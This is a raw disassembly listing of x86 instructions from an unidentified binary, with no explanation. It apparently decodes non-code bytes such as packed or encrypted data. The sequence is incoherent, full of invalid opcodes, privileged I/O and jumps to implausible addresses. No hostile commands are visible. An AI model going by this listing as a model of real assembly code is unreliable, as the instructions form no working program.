  41a486:	hlt    
  41a487:	xlat   BYTE PTR ds:[ebx]
  41a488:	lock mov al,0xf2
  41a48b:	into   
  41a48c:	jmp    0x41a486
  41a48e:	loope  0x41a488
  41a490:	mov    ebp,0xe5d3ccf4
  41a495:	or     edi,edi
  41a497:	(bad)  
  41a499:	hlt    
  41a49a:	jmp    0x41a4a7
  41a49c:	or     cl,dh
  41a49e:	out    0xc9,eax
  41a4a0:	scas   al,BYTE PTR es:[edi]
  41a4a1:	loopne 0x41a471
  41a4a3:	sti    
  41a4a4:	shl    BYTE PTR [eax-0x1019102d],1
  41a4aa:	rcr    al,1
  41a4ac:	clc    
  41a4ad:	mov    edx,0xd5f1bffa
  41a4b2:	jecxz  0x41a4b8
  41a4b4:	retf   
  41a4b5:	add    edx,ebp
  41a4b7:	jecxz  0x41a4a3
  41a4b9:	fcmovne st,st(2)
  41a4bb:	or     edi,ebx
  41a4bd:	cld    
  41a4be:	jmp    0x41a47f
  41a4c0:	fsubr  st(0),st
  41a4c2:	aad    0xe5
  41a4c4:	out    0xe1,al
  41a4c6:	in     eax,dx
  41a4c7:	shl    BYTE PTR [esi-0x508332c],1
  41a4cd:	leave  
  41a4ce:	(bad)  
  41a4d0:	aam    0xff
  41a4d2:	add    al,BYTE PTR ds:0xd7c0e5c0
  41a4d8:	push   cs
  41a4d9:	hlt    
  41a4da:	clc    
  41a4db:	add    esi,ebp
  41a4dd:	repnz mov esp,0xecb3c1ad
  41a4e3:	mov    bh,0xb1
  41a4e5:	in     eax,0xe4
  41a4e7:	out    dx,al
  41a4e8:	sar    ebx,1
  41a4ea:	fdivrp st(4),st
  41a4ec:	not    edx
  41a4ee:	aam    0xd7
  41a4f0:	push   es
  41a4f1:	lock dec esp
  41a4f4:	repnz pop es
  41a4f6:	clc    
  41a4f7:	add    esi,ebp
  41a4f9:	or     eax,0xe6e5fe09
  41a4fe:	shr    bh,cl
  41a500:	call   0xd3337ac1
  41a505:	shl    BYTE PTR [ebp-0x4b324b0d],0xfc
  41a50c:	mov    esp,0xf9c1e2bf
  41a511:	mov    ebp,0x1e6f8d3
  41a516:	xlat   BYTE PTR ds:[ebx]
  41a517:	jmp    0xe526ae04
  41a51c:	push   es
  41a51d:	add    dl,cl
  41a51f:	(bad)  
  41a520:	fmulp  st(4),st
  41a522:	ror    dh,cl
  41a524:	repnz ror esi,0xb8
  41a528:	clc    
  41a529:	(bad)
  41a52c:	sti    
  41a52d:	fstp   st(2)
  41a52f:	add    dh,ch
  41a531:	icebp  
  41a532:	fld    QWORD PTR [eax]
  41a534:	or     bl,al
  41a536:	icebp  
  41a537:	out    dx,eax
  41a538:	sti    
  41a539:	(bad)  
  41a53a:	in     eax,0xef
  41a53c:	les    edx,FWORD PTR [ecx]
  41a53e:	jmp    0x41a510
  41a540:	loopne 0x41a523
  41a542:	ret    0xc5f7
  41a545:	ret    0xe6ce
  41a548:	enter  0xfdf4,0xbf
  41a54c:	out    dx,al
  41a54d:	hlt    
  41a54e:	sar    bh,cl
  41a550:	mov    esi,0xfec1e0b4
  41a555:	add    ecx,ecx
  41a557:	pop    es
  41a558:	out    dx,eax
  41a559:	inc    ebx
  41a55b:	(bad)  
  41a55c:	into   
  41a55d:	pop    es
  41a55e:	out    dx,al
  41a55f:	(bad)  
  41a560:	lods   eax,DWORD PTR ds:[esi]
  41a561:	test   al,0xab
  41a563:	(bad)
  41a566:	into   
  41a567:	sti    
  41a568:	mov    al,0xce
  41a56a:	shl    BYTE PTR [eax+edx*8-0x1d221c0c],1
  41a571:	ret    
  41a572:	ffreep st(5)
  41a574:	loop   0x41a54e
  41a576:	rol    DWORD PTR [edi+ebp*8],0xff
  41a57a:	fmul   DWORD PTR [ebx]
  41a57c:	jecxz  0x41a55d
  41a57e:	fdiv   DWORD PTR [ecx-0x3710303c]
  41a584:	aam    0xf6
  41a586:	mov    ah,0xd5
  41a588:	call   0xd5ff6147
  41a58d:	lock (bad) 
  41a58f:	mov    esp,0xc3dfdafe
  41a594:	mov    ebp,0xe0dbc107
  41a599:	fucomp st(6)
  41a59b:	(bad)  
  41a59e:	call   0xd531914b
  41a5a3:	retf   
  41a5a4:	mov    al,0xe1
  41a5a6:	mov    al,0xe5
  41a5a8:	retf   0xf0e4
  41a5ab:	mov    ah,0xfe
  41a5ad:	retf   0xdaba
  41a5b0:	fdivr  QWORD PTR [eax-0x2e23391b]
  41a5b6:	jmp    0xc80fa77b
  41a5bb:	jmp    0x41a5c9
  41a5bd:	leave  
  41a5be:	ret    
  41a5bf:	icebp  
  41a5c0:	shl    DWORD PTR [ecx-0x192a1c2e],1
  41a5c6:	mov    bh,0xc8
  41a5c8:	call   esp
  41a5ca:	shr    edx,cl
  41a5cc:	iret   
  41a5cd:	mov    edi,0xd8d7f0fa
  41a5d2:	int    0xf0
  41a5d4:	lds    edi,FWORD PTR [eax+0x9fcfcda]
  41a5da:	iret   
  41a5db:	or     esp,edi
  41a5dd:	retf   0xe7b9
  41a5e0:	test   eax,0xd0d1e1d4
  41a5e6:	mov    dh,0xcc
  41a5e8:	(bad)  
  41a5e9:	out    dx,al
  41a5ea:	fstp   TBYTE PTR [esi-0x27433626]
  41a5f0:	pop    es
  41a5f1:	(bad)  
  41a5f2:	fdivr  st(5),st
  41a5f4:	sti    
  41a5f5:	out    0x0,al
  41a5f7:	std    
  41a5f8:	xlat   BYTE PTR ds:[ebx]
  41a5f9:	fxch   st(1)
  41a5fb:	aam    0xfc
  41a5fd:	in     al,0xca
  41a5ff:	icebp  
  41a600:	jecxz  0x41a5e9
  41a602:	fsubr  st(5),st
  41a604:	into   
  41a605:	sti    
  41a606:	mov    ecx,0xd0dbb8f3
  41a60b:	mov    edx,0xfef0e2eb
  41a610:	out    0xdb,al
  41a612:	mov    esp,0xcad507c3
  41a617:	fisttp DWORD PTR [edx]
  41a619:	loope  0x41a5ea
  41a61b:	(bad)  
  41a61d:	adc    eax,esp
  41a61f:	jmp    0x41a5ff
  41a621:	fisubr WORD PTR [edx+edx*8-0x4f39091d]
  41a628:	mov    ecx,0xc9cdcbea
  41a62d:	lock (bad) 
  41a630:	add    ebx,edi
  41a632:	cli    
  41a633:	dec    ebx
  41a635:	ret    0xf5db
  41a638:	in     al,0xb
  41a63a:	in     eax,0xea
  41a63c:	cli    
  41a63d:	add    al,0xbf
  41a63f:	mov    al,0xdc
  41a641:	(bad)  
  41a642:	lock retf 0xd0db
  41a646:	ror    dh,0xf4
  41a649:	mov    ecx,0xd0f8fff1
  41a64e:	mov    edx,0xe3c0d8cd
  41a653:	fcmove st,st(3)
  41a655:	aad    0x3
  41a657:	cld    
  41a658:	mov    ebp,0x6e3f8cb
  41a65d:	jmp    0xed216f20
  41a662:	ret    0xe2f7
  41a665:	int    0xce
  41a667:	repz sar BYTE PTR [ebx-0xc0a4635],1
  41a66e:	fsub   st,st(0)
  41a670:	repz icebp 
  41a672:	int3   
  41a673:	cli    
  41a674:	mov    ebp,0xcb06d8da
  41a679:	jmp    0x41a684
  41a67b:	inc    DWORD PTR [ecx]
  41a67d:	in     al,0xbc
  41a67f:	out    0xd2,al
  41a681:	mov    dl,0xca
  41a683:	xlat   BYTE PTR ds:[ebx]
  41a684:	mov    dl,0xf2
  41a686:	leave  
  41a687:	(bad)  
  41a68a:	(bad)  
  41a68b:	int3   
  41a68c:	leave  
  41a68d:	mov    al,0xc9
  41a68f:	fcom   st(3)
  41a691:	std    
  41a692:	jecxz  0x41a673
  41a694:	aad    0xe3
  41a696:	leave  
  41a697:	loopne 0x41a682
  41a699:	in     eax,dx
  41a69a:	or     al,0x8
  41a69c:	clc    
  41a69d:	repnz fdivr QWORD PTR [edi-0x51231658]
  41a6a4:	(bad)  
  41a6a5:	out    0xcf,eax
  41a6a7:	aad    0xce
  41a6a9:	shr    ah,cl
  41a6ab:	hlt    
  41a6ac:	aad    0xb9
  41a6ae:	in     eax,dx
  41a6af:	in     al,dx
  41a6b0:	loopne 0x41a672
  41a6b2:	std    
  41a6b3:	(bad)  
  41a6b4:	loop   0x41a6b7
  41a6b6:	add    eax,0xc6c7ebe4
  41a6bb:	loop   0x41a699
  41a6bd:	push   es
  41a6be:	repz shr DWORD PTR [esi-0x292c4c1c],cl
  41a6c5:	(bad)  
  41a6c6:	int    0xe5
  41a6c8:	neg    al
  41a6ca:	retf   0xd1df
  41a6cd:	bnd call edi
  41a6d0:	aad    0xfc
  41a6d2:	(bad)
  41a6d5:	jmp    0xe2ca:0xe2e7ded8
  41a6dc:	jmp    0x41a6e3
  41a6de:	scas   eax,DWORD PTR es:[edi]
  41a6df:	in     al,0xe0
  41a6e1:	repnz in eax,dx
  41a6e3:	mov    bl,0xc3
  41a6e5:	sti    
  41a6e6:	mov    ecx,0xbbd6f4c8
  41a6eb:	sti    
  41a6ec:	dec    bh
  41a6ee:	test   BYTE PTR [eax],0xcc
  41a6f1:	(bad)  
  41a6f2:	stc    
  41a6f3:	push   es
  41a6f4:	mov    esp,0xf408d6de
  41a6f9:	jecxz  0x41a6c0
  41a6fb:	out    0xd9,al
  41a6fd:	jmp    0x41a6f2
  41a6ff:	jmp    0xb81153e6
  41a704:	jmp    0xe51b6c02
  41a709:	aad    0xf5
  41a70b:	into   
  41a70c:	stc    
  41a70d:	std    
  41a70e:	fdiv   st(2),st
  41a710:	mov    esi,0xe3d6ffe0
  41a715:	jmp    0x519af1c
  41a71a:	in     eax,0xfb
  41a71c:	add    eax,0xcbc8eefa
  41a721:	(bad)  
  41a722:	hlt    
  41a723:	cmc    
  41a724:	mov    ebx,0xf4c8f6c0
  41a729:	vpaddb ymm3,ymm0,ymm7
  41a72d:	jmp    0x4366404
  41a732:	int    0xd0
  41a734:	loop   0x41a735
  41a736:	fcomp  st(4)
  41a738:	add    edx,ebx
  41a73a:	add    ah,ah
  41a73c:	jmp    0xe8f5:0xcbcfc6eb
  41a743:	retf   
  41a744:	int    0xea
  41a746:	shl    eax,0xf1
  41a749:	mov    eax,0xf5fbd9ea
  41a74e:	icebp  
  41a74f:	int3   
  41a750:	repnz (bad) 
  41a752:	loopne 0x41a72b
  41a754:	std    
  41a755:	jecxz  0x41a748
  41a757:	inc    esp
  41a759:	add    DWORD PTR [edi],eax
  41a75b:	or     eax,0xe5b2cee0
  41a760:	jmp    0xfbc8:0xe6e5afe8
  41a767:	in     al,dx
  41a768:	fcmovnb st,st(4)
  41a76a:	mov    ch,0xdd
  41a76c:	lock (bad) 
  41a76e:	clc    
  41a76f:	mov    dh,0xce
  41a771:	out    0xfa,al
  41a773:	add    al,al
  41a775:	or     al,BYTE PTR ds:0x5c90f00
  41a77b:	(bad)  
  41a77c:	(bad)  
  41a77e:	(bad)
  41a781:	into   
  41a782:	mov    cl,0xd3
  41a784:	hlt    
  41a785:	leave  
  41a786:	aam    0xf1
  41a788:	rol    esi,cl
  41a78a:	retf   
  41a78b:	jecxz  0x41a75c
  41a78d:	enter  0xf903,0xdf
  41a791:	(bad)  
  41a793:	fsub   st(3),st
  41a795:	stc    
  41a796:	jmp    0x41a78d
  41a798:	psubw  mm5,mm5
  41a79b:	(bad)  
  41a79c:	adc    bl,cl
  41a79e:	fdiv   st,st(7)
  41a7a0:	into   
  41a7a1:	xlat   BYTE PTR ds:[ebx]
  41a7a2:	(bad)  
  41a7a3:	call   0xd92ba194
  41a7a8:	retf   0xb3b4
  41a7ab:	call   0xcf2160ae
  41a7b0:	add    cl,dh
  41a7b2:	repnz fincstp 
  41a7b5:	in     al,0xd8
  41a7b7:	sti    
  41a7b8:	cli    
  41a7b9:	fld    DWORD PTR [ebx]
  41a7bb:	inc    DWORD PTR [esi+ebx*8]
  41a7be:	ror    cl,1
  41a7c0:	lods   al,BYTE PTR ds:[esi]
  41a7c1:	jmp    0xc91c6eb6
  41a7c6:	sar    bl,0xe9
  41a7c9:	in     eax,dx
  41a7ca:	out    dx,eax
  41a7cb:	mov    ah,0xfa
  41a7cd:	fucomp st(5)
  41a7cf:	fmul   st(4),st
  41a7d1:	(bad)  
  41a7d2:	mov    esp,0x3f4d3f0
  41a7d7:	fadd   DWORD PTR [esi]
  41a7d9:	into   
  41a7da:	fdivp  st(2),st
  41a7dc:	repnz enter 0xe1e8,0xd3
  41a7e1:	in     eax,dx
  41a7e2:	div    ebp
  41a7e4:	iret   
  41a7e5:	jmp    0xcc0da7ca
  41a7ea:	dec    ebp
  41a7ec:	mov    ecx,0xbce7f3f3
  41a7f1:	ret    
  41a7f2:	rol    BYTE PTR [edi],0x6
  41a7f5:	(bad)  
  41a7f6:	(bad)  
  41a7f8:	loope  0x41a7ee
  41a7fa:	(bad)  
  41a7fb:	(bad)  
  41a7fd:	stc    
  41a7fe:	lods   al,BYTE PTR ds:[esi]
  41a7ff:	into   
  41a800:	ret    
  41a801:	lock retf 
  41a803:	leave  
  41a804:	repnz in al,0xf8
  41a807:	int    0xf4
  41a809:	in     eax,0xd4
  41a80b:	call   0xe9019509
  41a810:	sar    ecx,1
  41a812:	ret    
  41a813:	aam    0xe4
  41a815:	(bad)  
  41a817:	aam    0x9
  41a819:	add    al,0xe0
  41a81b:	(bad)
  41a81e:	loope  0x41a804
  41a820:	mov    bl,0xf1
  41a822:	shr    ebx,0xd2
  41a825:	call   0xf1269002
  41a82a:	mov    bh,0xf9
  41a82c:	sar    BYTE PTR [edi-0x2e401d32],cl
  41a832:	in     eax,0xfb
  41a834:	jecxz  0x41a7f9
  41a836:	in     eax,0x5
  41a838:	(bad)  
  41a839:	jmp    0xd8ca:0xfebcadd
  41a840:	in     al,dx
  41a841:	test   ecx,0xf4caf3cd
  41a847:	retf   0xe5da
  41a84a:	sar    dl,1
  41a84c:	loop   0x41a829
  41a84e:	in     al,dx
  41a84f:	mov    esi,0xc6bdeef5
  41a854:	pop    es
  41a855:	retf   0x8e5
  41a858:	fadd   DWORD PTR ds:0xebe306da
  41a85e:	out    0xa8,eax
  41a860:	ror    al,cl
  41a862:	aam    0xd4
  41a864:	lods   al,BYTE PTR ds:[esi]
  41a865:	not    dh
  41a867:	mov    cl,0xf3
  41a869:	jmp    0xe33aa664
  41a86e:	sar    eax,1
  41a870:	loopne 0x41a86f
  41a872:	shl    bh,cl
  41a874:	mov    esp,0xdd0bcade
  41a879:	fadd   st(5),st
  41a87b:	retf   
  41a87c:	retf   
  41a87d:	clc    
  41a87e:	jmp    0xcee7:0xabc7d7be
  41a885:	div    BYTE PTR [ebx-0x154a2e4e]
  41a88b:	iret   
  41a88c:	iret   
  41a88d:	mov    esp,0xf1e7eff3
  41a892:	ret    
  41a893:	std    
  41a894:	repz idiv dh
  41a897:	jmp    0xccda:0xdbefe6d9
  41a89e:	(bad)
  41a8a1:	mov    esi,0xc4a9b3ee
  41a8a6:	not    eax
  41a8a8:	fadd   st,st(6)
  41a8aa:	shl    dh,1
  41a8ac:	rol    BYTE PTR [ebx],1
  41a8ae:	jmp    0xf642799f
  41a8b3:	lds    eax,FWORD PTR [eax]
  41a8b5:	in     al,0xc9
  41a8b7:	aad    0xc9
  41a8b9:	fimul  WORD PTR [edx]
  41a8bb:	iret   
  41a8bc:	or     bh,al
  41a8be:	in     eax,0xf2
  41a8c0:	repnz scas eax,DWORD PTR es:[edi]
  41a8c2:	jmp    0xdef4:0xcff1e7b2
  41a8c9:	enter  0xbbed,0xd2
  41a8cd:	repz hlt 
  41a8cf:	mov    ecx,0xfad3f5d0
  41a8d4:	sar    bl,1
  41a8d6:	retf   0xc4f8
  41a8d9:	retf   0xb08
  41a8dc:	add    ecx,edx
  41a8de:	jmp    0xb22a9aae
  41a8e3:	mov    dl,0xe5
  41a8e5:	mov    ebx,0xc4adb8d8
  41a8ea:	rcl    ch,cl
  41a8ec:	mov    ch,0xca
  41a8ee:	mov    ecx,0xe5f7bcf6
  41a8f3:	mov    edx,0xda00ffe0
  41a8f8:	out    0xdc,al
  41a8fa:	out    0x0,eax
  41a8fc:	in     al,dx
  41a8fd:	add    cl,cl
  41a8ff:	in     al,dx
  41a900:	lock jecxz 0x41a8b9
  41a903:	call   0xdc375afb
  41a908:	mov    al,0xf6
  41a90a:	in     eax,dx
  41a90b:	mov    esp,0xcef5c9d0
  41a910:	cmc    
  41a911:	sar    cl,0xf1
  41a914:	jmp    0x41a8fa
  41a916:	loopne 0x41a90f
  41a918:	fild   WORD PTR [edi]
  41a91a:	sti    
  41a91b:	fisttp DWORD PTR [eax]
  41a91d:	jecxz  0x41a904
  41a91f:	out    dx,al
  41a920:	repnz shr al,0xd1
  41a924:	mov    ah,0xfb
  41a926:	cmc    
  41a927:	in     eax,0xd5
  41a929:	repz mov eax,0xd4fcdccd
  41a92f:	add    esi,eax
  41a931:	icebp  
  41a932:	fdiv   st(7),st
  41a934:	(bad)  
  41a935:	sti    
  41a936:	(bad)  
  41a938:	out    0xdf,eax
  41a93a:	ret    
  41a93b:	in     eax,dx
  41a93c:	sti    
  41a93d:	adc    ebp,ebp
  41a93f:	test   al,0xdc
  41a941:	lods   al,BYTE PTR ds:[esi]
  41a942:	in     eax,dx
  41a943:	in     eax,0xd4
  41a945:	icebp  
  41a946:	leave  
  41a947:	iret   
  41a948:	retf   0xefb4
  41a94b:	add    edi,eax
  41a94d:	repz rcr ecx,cl
  41a950:	clc    
  41a951:	stc    
  41a952:	mov    ebx,0xe802dbe6
  41a957:	fcomip st,st(7)
  41a959:	loopne 0x41a95c
  41a95b:	in     eax,dx
  41a95c:	sti    
  41a95d:	out    0xc2,al
  41a95f:	loop   0x41a91e
  41a961:	in     al,0xed
  41a963:	(bad)  
  41a964:	test   eax,0xb7c4d1d4
  41a969:	mov    ch,0xbe
  41a96b:	leave  
  41a96c:	into   
  41a96d:	int3   
  41a96e:	ret    
  41a96f:	loope  0x41a948
  41a971:	stc    
  41a972:	sti    
  41a973:	icebp  
  41a974:	xlat   BYTE PTR ds:[ebx]
  41a975:	add    eax,0x9f8e1ff
  41a97a:	loopne 0x41a967
  41a97c:	fdivr  st,st(5)
  41a97e:	fild   QWORD PTR [edi+ebp*4-0xa3a1d50]
  41a985:	out    dx,eax
  41a986:	repnz aad 0xdf
  41a989:	(bad)  
  41a98a:	mov    ebp,0xdfd703d9
  41a98f:	mov    ecx,0xfdc00100
  41a994:	sti    
  41a995:	or     ebp,ecx
  41a997:	(bad)  
  41a999:	neg    dl
  41a99b:	out    0xf8,eax
  41a99d:	(bad)  
  41a99f:	mov    esi,0xc1f0d1bd
  41a9a4:	retf   0xd5c4
  41a9a7:	out    0xcc,al
  41a9a9:	into   
  41a9aa:	retf   0xf6c4
  41a9ad:	mov    eax,0xf7d8d3d9
  41a9b2:	std    
  41a9b3:	repnz repnz loope 0x41a9bf
  41a9b7:	jmp    0x41a9bf
  41a9b9:	or     ebx,edi
  41a9bb:	jmp    0xb42eae85
  41a9c0:	(bad)  [esi-0x2f0d1814]
  41a9c6:	leave  
  41a9c7:	enter  0xb0f4,0xdc
  41a9cb:	neg    dh
  41a9cd:	into   
  41a9ce:	mov    bh,0xce
  41a9d0:	out    dx,eax
  41a9d1:	jecxz  0x41a9cc
  41a9d3:	(bad)  
  41a9d4:	icebp  
  41a9d5:	add    al,0xb
  41a9d7:	(bad)
  41a9da:	or     ecx,ebp
  41a9dc:	jmp    0xf2e899b0
  41a9e1:	out    dx,eax
  41a9e2:	cmc    
  41a9e3:	lods   eax,DWORD PTR ds:[esi]
  41a9e4:	shl    esp,1
  41a9e6:	iret   
  41a9e7:	out    0xb0,eax
  41a9e9:	sti    
  41a9ea:	repnz retf 0xd7ef
  41a9ee:	in     eax,dx
  41a9ef:	(bad)  
  41a9f0:	int    0xbf
  41a9f2:	(bad)  
  41a9f3:	rol    ecx,1
  41a9f5:	icebp  
  41a9f6:	fdiv   st,st(0)
  41a9f8:	dec    edi
  41a9fa:	(bad)
  41a9fd:	add    al,0xcd
  41a9ff:	scas   al,BYTE PTR es:[edi]
  41aa00:	jecxz  0x41a9be
  41aa02:	out    0xae,eax
  41aa04:	div    DWORD PTR [edx-0xe4e1f13]
  41aa0a:	shr    ebp,1
  41aa0c:	fild   WORD PTR [ebx]
  41aa0e:	mov    ebp,0xd3f6ecbc
  41aa13:	in     eax,0xf1
  41aa15:	fucom  st(5)
  41aa17:	add    edi,ebx
  41aa19:	retf   0xe1c7
  41aa1c:	leave  
  41aa1d:	repnz int 0xe1
  41aa20:	rol    edx,1
  41aa22:	int    0xe0
  41aa24:	xlat   BYTE PTR ds:[ebx]
  41aa25:	into   
  41aa26:	stc    
  41aa27:	repz int 0xc8
  41aa2a:	lock fdiv st,st(0)
  41aa2d:	int3   
  41aa2e:	add    dl,cl
  41aa30:	(bad)  
  41aa32:	shl    al,0xe6
  41aa35:	ret    
  41aa36:	or     ebx,edi
  41aa38:	dec    bh
  41aa3a:	stc    
  41aa3b:	std    
  41aa3c:	into   
  41aa3d:	int    0xcf
  41aa3f:	stos   BYTE PTR es:[edi],al
  41aa40:	(bad)  
  41aa41:	(bad)  
  41aa42:	scas   eax,DWORD PTR es:[edi]
  41aa43:	rol    esi,0xd3
  41aa46:	into   
  41aa47:	div    cl
  41aa49:	mov    dh,0xc4
  41aa4b:	in     eax,dx
  41aa4c:	sti    
  41aa4d:	dec    eax
  41aa4f:	fsub   st,st(1)
  41aa51:	faddp  st(3),st
  41aa53:	(bad)  
  41aa55:	rol    BYTE PTR [edi],0xf6
  41aa58:	les    eax,FWORD PTR [eax]
  41aa5a:	fucomp st(3)
  41aa5c:	or     al,0xca
  41aa5e:	jmp    0x41aa4d
  41aa60:	in     eax,0xc6
  41aa62:	(bad)  
  41aa63:	sti    
  41aa64:	out    dx,al
  41aa65:	les    ebp,FWORD PTR [edi-0x350b0c14]
  41aa6b:	retf   
  41aa6c:	in     eax,dx
  41aa6d:	(bad)  
  41aa6e:	mov    ebp,0xc6e0c2fd
  41aa73:	int3   
  41aa74:	aam    0x2
  41aa76:	add    dh,ah
  41aa78:	(bad)  
  41aa79:	(bad)  [edi]
  41aa7b:	in     al,0xf8
  41aa7d:	icebp  
  41aa7e:	lods   eax,DWORD PTR ds:[esi]
  41aa7f:	iret   
  41aa80:	jecxz  0x41aa4b
  41aa82:	fucom  st(2)
  41aa84:	shl    BYTE PTR [edx-0x3227470e],cl
  41aa8a:	repz sar DWORD PTR [edx-0x28323041],cl
  41aa91:	ret    
  41aa92:	frstpm(287 only) 
  41aa94:	hlt    
  41aa95:	or     edx,edi
  41aa97:	neg    bl
  41aa99:	iret   
  41aa9a:	sti    
  41aa9b:	in     eax,0x6
  41aa9d:	out    dx,eax
  41aa9e:	(bad)  [esi-0x114a210e]
  41aaa4:	loope  0x41aa57
  41aaa6:	call   0xbe3996a4
  41aaab:	in     eax,dx
  41aaac:	iret   
  41aaad:	idiv   BYTE PTR [esi-0x33180213]
  41aab3:	jmp    0x41aaa0
  41aab5:	add    esp,edi
  41aab7:	push   es
  41aab8:	jmp    0xf002:0x13dffc04
  41aabf:	jmp    0xcae6:0xeac2edca
  41aac6:	cmc    
  41aac7:	aad    0xf4
  41aac9:	fmul   st,st(4)
  41aacb:	mov    edi,0xe3cec8cf
  41aad0:	clc    
  41aad1:	in     al,dx
  41aad2:	out    0xe6,eax
  41aad4:	hlt    
  41aad5:	cmc    
  41aad6:	std    
  41aad7:	loopne 0x41aab3
  41aad9:	add    eax,0xcbcb13c7
  41aade:	mov    dl,0xce
  41aae0:	(bad)  
  41aae2:	test   ch,0xeb
  41aae5:	fxtract 
  41aae7:	(bad)  
  41aae8:	stc    
  41aae9:	mov    ebx,0xf8b4cfcf
  41aaee:	call   0xc22e83ac
  41aaf3:	fiadd  WORD PTR ds:0xebfad506
  41aaf9:	aam    0x7
  41aafb:	pop    es
  41aafc:	cli    
  41aafd:	push   es
  41aafe:	shl    ah,1
  41ab00:	out    dx,eax
  41ab01:	mov    edi,0xf8bae8c2
  41ab07:	cli    
  41ab08:	jmp    0x41aac9
  41ab0a:	fcmovnbe st,st(4)
  41ab0c:	add    ebp,esi
  41ab0e:	shl    eax,cl
  41ab10:	shl    edx,0xbf
  41ab13:	cld    
  41ab14:	fdivp  st(6),st
  41ab16:	loope  0x41aadc
  41ab18:	out    dx,al
  41ab19:	enter  0x60c,0xd9
  41ab1d:	call   0xeaf49a11
  41ab22:	mov    bh,0xd4
  41ab24:	(bad)  
  41ab25:	idiv   eax
  41ab27:	out    dx,eax
  41ab28:	mov    eax,0xcbccdedd
  41ab2d:	mov    edx,0xd3dafb02
  41ab32:	pop    es
  41ab33:	stc    
  41ab34:	lock retf 0xf401
  41ab38:	fdivp  st(4),st
  41ab3a:	aad    0x8
  41ab3c:	fisttp DWORD PTR [esp+eiz*8]
  41ab3f:	fistp  QWORD PTR [ebp-0x2e0c4d58]
  41ab45:	iret   
  41ab46:	out    0xb9,al
  41ab48:	mov    ch,0xf3
  41ab4a:	idiv   ebp
  41ab4c:	repz clc 
  41ab4e:	xlat   BYTE PTR ds:[ebx]
  41ab4f:	sti    
  41ab50:	ffree  st(3)
  41ab52:	fdivrp st(3),st
  41ab54:	pop    es
  41ab55:	loop   0x41ab53
  41ab57:	loopne 0x41ab36
  41ab59:	add    eax,0xe512c5f8
  41ab5e:	(bad)  
  41ab5f:	int    0xe0
  41ab61:	out    0xd2,al
  41ab63:	(bad)  
  41ab64:	repnz test al,0xc0
  41ab67:	jmp    0xf6d2:0xd0ffc4f3
  41ab6e:	fcmovb st,st(3)
  41ab70:	shl    cl,cl
  41ab72:	(bad)  
  41ab73:	loop   0x41ab66
  41ab75:	ret    
  41ab76:	loopne 0x41ab62
  41ab78:	call   0xe11a476
  41ab7d:	int    0xe6
  41ab7f:	mov    edi,0xb5d2f5f7
  41ab84:	mov    ch,0xac
  41ab86:	out    0xdf,eax
  41ab88:	div    ebp
  41ab8a:	enter  0xd1ff,0x3
  41ab8e:	fcomi  st,st(6)
  41ab90:	(bad)  
  41ab91:	out    dx,al
  41ab92:	(bad)  
  41ab94:	test   dl,0x2
  41ab97:	loop   0x41ab8f
  41ab99:	leave  
  41ab9a:	or     BYTE PTR [esi],cl
  41ab9c:	jmp    0x41ab91
  41ab9e:	stos   BYTE PTR es:[edi],al
  41ab9f:	in     eax,0xb3
  41aba1:	shr    edx,1
  41aba3:	mov    ch,0xec
  41aba5:	lods   al,BYTE PTR ds:[esi]
  41aba6:	mov    cl,0xd0
  41aba8:	xlat   BYTE PTR ds:[ebx]
  41aba9:	lods   al,BYTE PTR ds:[esi]
  41abaa:	fdivr  st,st(1)
  41abac:	cmc    
  41abad:	mov    esi,0xf3f1c1b7
  41abb2:	shl    cl,1
  41abb4:	shl    esi,1
  41abb6:	ret    
  41abb7:	mov    esi,0xb09ef08
  41abbc:	or     ch,al
  41abbe:	(bad)  
  41abbf:	retf   0xc2df
  41abc2:	repnz repnz jecxz 0x41aba7
  41abc6:	not    ch
  41abc8:	(bad)
  41abcb:	shl    ebx,1
  41abcd:	(bad)  
  41abce:	shr    eax,cl
  41abd0:	out    0xd0,al
  41abd2:	repnz add bl,bh
  41abd5:	icebp  
  41abd6:	mov    ecx,0xffffad8
  41abdc:	add    eax,0xb2eda90d
  41abe1:	in     eax,dx
  41abe2:	jmp    0x41abd9
  41abe4:	mov    al,0xe0
  41abe6:	sti    
  41abe7:	int3   
  41abe8:	mov    edi,0xf9f9c4e8
  41abed:	in     eax,dx
  41abee:	fld    st(1)
  41abf0:	add    edx,edx
  41abf2:	cmc    
  41abf3:	add    edx,ebx
  41abf5:	loopne 0x41abf4
  41abf7:	fxam   
  41abf9:	add    eax,0xdd9e8e3
  41abfe:	stos   DWORD PTR es:[edi],eax
  41abff:	enter  0xd6a9,0xc2
  41ac03:	shl    BYTE PTR [esi-0x31291e4b],0xf7
  41ac0a:	fistp  QWORD PTR [ecx-0x470efe35]
  41ac10:	repz stc 
  41ac12:	fisttp DWORD PTR [ebx]
  41ac14:	sti    
  41ac15:	add    eax,0x5cbc50b
  41ac1a:	cli    
  41ac1b:	out    0xfd,al
  41ac1d:	jmp    0xd3e0:0xe7c4caf1
  41ac24:	int    0xd7
  41ac26:	mov    ebx,0xb9dabbd6
  41ac2b:	fdivr  QWORD PTR [eax+0x2f8babc]
  41ac31:	in     eax,0x7
  41ac33:	pop    es
  41ac34:	push   es
  41ac35:	fild   DWORD PTR [esi]
  41ac37:	add    eax,0x130a07e2
  41ac3c:	stc    
  41ac3d:	add    eax,0xb1eae9c5
  41ac42:	in     al,dx
  41ac43:	out    dx,al
  41ac44:	fcomi  st,st(0)
  41ac46:	mov    ah,0xec
  41ac48:	lock div eax
  41ac4b:	shr    dh,cl
  41ac4d:	out    dx,al
  41ac4e:	mov    ebx,0x6fbd7c2
  41ac53:	sti    
  41ac54:	cli    
  41ac55:	dec    ecx
  41ac57:	add    edx,edi
  41ac59:	(bad)  
  41ac5a:	in     al,0xd8
  41ac5c:	out    0xde,eax
  41ac5e:	into   
  41ac5f:	call   0xb3038a4f
  41ac64:	ror    ecx,0xb6
  41ac67:	leave  
  41ac68:	(bad)  
  41ac69:	ror    bh,cl
  41ac6b:	shl    al,cl
  41ac6d:	mov    ah,0xd3
  41ac6f:	ret    
  41ac70:	(bad)  
  41ac71:	loope  0x41ac31
  41ac73:	shl    dl,1
  41ac75:	jmp    0xde2caf3b
  41ac7a:	retf   
  41ac7b:	in     al,0xc8
  41ac7d:	retf   
  41ac7e:	shl    al,cl
  41ac80:	(bad)  [ebp-0x3b051e29]
  41ac86:	leave  
  41ac87:	sti    
  41ac88:	mov    edi,0xd6dfdef0
  41ac8d:	hlt    
  41ac8e:	icebp  
  41ac8f:	rcl    ah,0xf1
  41ac92:	clc    
  41ac93:	ror    DWORD PTR [ebx],1
  41ac95:	(bad)  
  41ac97:	leave  
  41ac98:	leave  
  41ac99:	sti    
  41ac9a:	jmp    0xca488c9f
